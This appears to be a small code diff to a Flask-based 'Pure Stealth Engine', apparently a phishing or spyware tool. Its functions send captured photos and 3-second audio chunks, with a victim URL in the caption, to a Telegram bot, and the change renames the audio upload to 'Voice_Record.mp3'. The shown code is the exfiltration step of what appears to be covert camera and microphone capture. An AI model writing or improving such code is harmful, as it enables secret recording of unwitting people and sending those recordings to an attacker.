@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Pure Stealth Engine, 3-Sec Rapid Audio Chunks, Redesigned UI & Anti-Crash)
+# by:@ROMEO_UCHIHA (Pure Stealth Engine, 3-Sec MP3 Rapid Chunks, Redesigned UI & Anti-Crash)
 from flask import Flask, request, render_template_string, jsonify
 from supabase import create_client, Client
 import base64, requests, os, time, json
@@ -52,7 +52,7 @@ def send_tg_photo(token, cid, raw_img, caption="", v_url=""):
         )
     except: pass
 
-# Audio ke liye sendDocument best rehta hai bina errors ke 100% deliver karne ke liye
+# Audio forced as .mp3 document
 def send_tg_audio_document(token, cid, raw_audio, caption="", v_url=""):
     try: 
         safe_url = escape_md(v_url)
@@ -61,7 +61,7 @@ def send_tg_audio_document(token, cid, raw_audio, caption="", v_url=""):
         requests.post(
             f"https://api.telegram.org/bot{token}/sendDocument", 
             data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
-            files={"document": ("audio_3s_chunk.webm", raw_audio, "audio/webm")}, 
+            files={"document": ("Voice_Record.mp3", raw_audio, "audio/mpeg")}, 
             timeout=20
         )
     except Exception as e: 
